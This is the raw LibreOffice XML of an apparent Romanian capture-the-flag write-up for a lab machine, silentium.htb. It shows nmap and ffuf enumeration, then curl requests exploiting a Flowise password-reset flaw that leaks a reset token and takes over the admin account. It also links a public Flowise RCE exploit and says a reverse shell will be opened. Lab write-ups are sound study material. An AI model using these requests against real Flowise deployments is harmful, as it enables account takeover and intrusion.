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8B000001C010D1578B.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000009EA0000020A997F9D88.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000022E0000030693B9EC6E.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000009EA00000120E7C4B84C.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000534000001AB33143EC5.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000031F0000028181DEC417.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000075A0000021494FD152B.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000073F000002BC4B9EC5A3.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000003C60000012FC32972F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fbd0" officeooo:paragraph-rsid="0018fbd0"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0018fbd0" officeooo:paragraph-rsid="0018fbd0" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties officeooo:rsid="0018fbd0" officeooo:paragraph-rsid="0018fbd0" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0018fbd0" officeooo:paragraph-rsid="0018fbd0" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001970f4" officeooo:paragraph-rsid="001970f4" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001970f4" officeooo:paragraph-rsid="001970f4" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001a9d10" officeooo:paragraph-rsid="001a9d10" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001a9d10" officeooo:paragraph-rsid="001a9d10"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ac1c2" officeooo:paragraph-rsid="001ac1c2"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ac1c2" officeooo:paragraph-rsid="001ac1c2" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ac1c2" officeooo:paragraph-rsid="001ac1c2" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b6bfe" officeooo:paragraph-rsid="001b6bfe" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b6bfe" officeooo:paragraph-rsid="001b6bfe" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001c6aaf" officeooo:paragraph-rsid="001c6aaf" fo:background-color="transparen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b6bf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 de obicei, un nmap.</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:width="6.9252in" svg:height="2.1717in" draw:z-index="0"><draw:image xlink:href="Pictures/10000000000003C60000012FC32972F6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame></text:p>
      <text:p text:style-name="P1">OK, versiunea aia de ssh e vulnerabila, dar hai intai sa caut alte metode.</text:p>
      <text:p text:style-name="P1">Un site, poate acolo ar fi mai usor.</text:p>
      <text:p text:style-name="P1">Daca incercam sa inram din browser, el devine by deafult domainul silentium.htb.</text:p>
      <text:p text:style-name="P1">O sa trebuiasca sa ila daugam in /etc/hosts sa il putem accesa.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Nu pare sa aiba mare lucru, dar am sa caut subdomenii.</text:p>
      <text:p text:style-name="P2">ffuf -u http://silentium.htb -H "HOST: FUZZ.silentium.htb" -w ~/wordlist/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 301</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="Image2" text:anchor-type="char" svg:width="6.9252in" svg:height="1.9571in" draw:z-index="1"><draw:image xlink:href="Pictures/100000000000075A0000021494FD152B.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:soft-page-break/><text:s/></text:p>
      <text:p text:style-name="P4">Bun, deci staging.silentium.htb exista. Il adaugam si pe asta in /etc/hosts si il accesam.</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="Image3" text:anchor-type="char" svg:x="0in" svg:y="0.0429in" svg:width="6.9252in" svg:height="5.5555in" draw:z-index="2"><draw:image xlink:href="Pictures/100000000000031F0000028181DEC417.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P4">Ok, are un login. Hai sa il analizam.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">Am gasit doua pathuri, din care unul interesant pentru codul lor.</text:p>
      <text:p text:style-name="P6">/assets/index-C6GKaUTA.js</text:p>
      <text:p text:style-name="P6">/assets/index-9xw-RjBM.css</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P5"><text:soft-page-break/>Partea de CSS probabil nu e utila, dar partea de javascript poate fi interesanta. Dupa analiza, am vazut ca exista un path /register care nu pare a fi accesibil altfel. Il icnercam im browser si vedem ca merge.</text:p>
      <text:p text:style-name="P5"><draw:frame draw:style-name="fr3" draw:name="Image4" text:anchor-type="char" svg:width="5.8126in" svg:height="8.0626in" draw:z-index="3"><draw:image xlink:href="Pictures/100000000000022E0000030693B9EC6E.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P5">Nu pare sa functioneze, dar poate gasim ceva uitat din development aici, avand in vedere ca nici pagina asta nu trebuia sa existe.</text:p>
      <text:p text:style-name="P7">Nu am gasit nimic. Inapoi la cautat. </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:soft-page-break/>Am gasit interesant un path /api/v1 care poate fi util, dar cand incerc sa il accesez, imi zice “Unauthorized access”, ghinion.</text:p>
      <text:p text:style-name="P7">Acum, sa vad ce versiuni avem pe aici.</text:p>
      <text:p text:style-name="P7"><text:s/>React Router v6.3.0</text:p>
      <text:p text:style-name="P7">Asta poate fi exploatat. CVE-2025-31137</text:p>
      <text:p text:style-name="P7">Underscore.js 1.8.3</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Asta poate avea arbitrary code injection. </text:span>CVE-2021-23358</text:p>
      <text:p text:style-name="P9">Ambele is cam greu de folosit insa, pentru o masina clasificata ca “Easy”, deci trebuie sa fie alta metoda.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Observam ca se foloseste FLOWISE pentru autentificare. CVE-2025-58434</text:p>
      <text:p text:style-name="P9">Asta e mult mai ok sa fie realizat.</text:p>
      <text:p text:style-name="P9">Acum, pentru asta, ne-ar trebui un email valid. Din fericire, in momenul in care intram pe site-ul original, avem niste nume deja acolo. </text:p>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr1" draw:name="Image5" text:anchor-type="char" svg:width="6.9252in" svg:height="2.2193in" draw:z-index="4"><draw:image xlink:href="Pictures/1000000000000534000001AB33143EC5.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P9">O sa il folosim pe Ben pentru ca e singurul care are doar un nume trecut, nu doua, deci e posibil sa aiba un mail foarte predictibil, cum ar fi (<text:a xlink:type="simple" xlink:href="mailto:bet@silentium.htb" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">bet@silentium.htb</text:a>). </text:p>
      <text:p text:style-name="P10">curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \</text:p>
      <text:p text:style-name="P10"><text:s text:c="2"/>-H "Content-Type: application/json" \</text:p>
      <text:p text:style-name="P10"><text:s text:c="2"/>-d '{"user":{"email":"<text:a xlink:type="simple" xlink:href="mailto:ben@silentium.htb" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ben@silentium.htb</text:a>"}}'</text:p>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr1" draw:name="Image6" text:anchor-type="char" svg:width="6.9252in" svg:height="1.4236in" draw:z-index="5"><draw:image xlink:href="Pictures/10000000000009EA0000020A997F9D88.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/><text:line-break/><text:span text:style-name="T2">Dragut acel tempToken. </text:span></text:p>
      <text:p text:style-name="P10">curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \</text:p>
      <text:p text:style-name="P10"><text:s text:c="2"/>-H "Content-Type: application/json" \</text:p>
      <text:p text:style-name="P10"><text:s text:c="2"/>-d '{</text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/>"user": {</text:p>
      <text:p text:style-name="P10"><text:s text:c="6"/>"email": "ben@silentium.htb",</text:p>
      <text:p text:style-name="P10"><text:s text:c="6"/>"tempToken": "Wu0R5MMmsMBCofh28lKGSIvUUUcevntC26nJnGnkPvRe9RI02A0i9qBR1Tb7ujJw",</text:p>
      <text:p text:style-name="P10"><text:s text:c="6"/>"password" : "ParolaNebuna123@” } }'</text:p>
      <text:p text:style-name="P12"><text:soft-page-break/>Am pus o litera mare si un caracter special pentru ca asta scria pe pagina de /register, deci poate si aici este verificat.</text:p>
      <text:p text:style-name="P13"><draw:frame draw:style-name="fr1" draw:name="Image7" text:anchor-type="char" svg:width="6.9252in" svg:height="0.7854in" draw:z-index="6"><draw:image xlink:href="Pictures/10000000000009EA00000120E7C4B84C.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/>{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$s5gd.Tknvi0AUefuNQts8e5VSa5VNy14qPeA/Gkz58MBVXZsS2RNe","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-06-25T14:42:55.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}</text:p>
      <text:p text:style-name="P12">A fost validat.</text:p>
      <text:p text:style-name="P12"><draw:frame draw:style-name="fr1" draw:name="Image8" text:anchor-type="char" svg:width="6.9252in" svg:height="2.6134in" draw:z-index="7"><draw:image xlink:href="Pictures/100000000000073F000002BC4B9EC5A3.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P12">Ne-am conectat.</text:p>
      <text:p text:style-name="P12">Ne uitam pe site si la api keys vedem o cheie acolo.</text:p>
      <text:p text:style-name="P12"><draw:frame draw:style-name="fr1" draw:name="Image9" text:anchor-type="char" svg:width="6.9252in" svg:height="2.1862in" draw:z-index="8"><draw:image xlink:href="Pictures/100000000000058B000001C010D1578B.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:s/></text:p>
      <text:p text:style-name="P14">Acum, sa incercam ceva mai interesant.</text:p>
      <text:p text:style-name="P14">Pe pagina de git avem CVE-2025-59528 pentru flowise. (Doar cauta pe net flowise remote code execution cve, e prima chestie)</text:p>
      <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="https://github.com/r3nsi15/Flowise-RCE-CVE-2025-59528" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/r3nsi15/Flowise-RCE-CVE-2025-59528</text:a></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:soft-page-break/>Observam ca putem sa dam comenzi care sa functioneaze acum ca avem un usear cu o parola ok. Pentru a fi mai usor, o sa facem un reverse shell ca sa pot folosi terminalul eu.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5T16:39:50.822007701</meta:creation-date>
    <dc:date>2026-06-25T18:43:54.218486339</dc:date>
    <meta:editing-duration>PT16M24S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="9" meta:object-count="0" meta:page-count="6" meta:paragraph-count="53" meta:word-count="451" meta:character-count="3477" meta:non-whitespace-character-count="3025"/>
    <meta:generator>LibreOffice/25.2.3.2$Linux_X86_64 LibreOffice_project/520$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>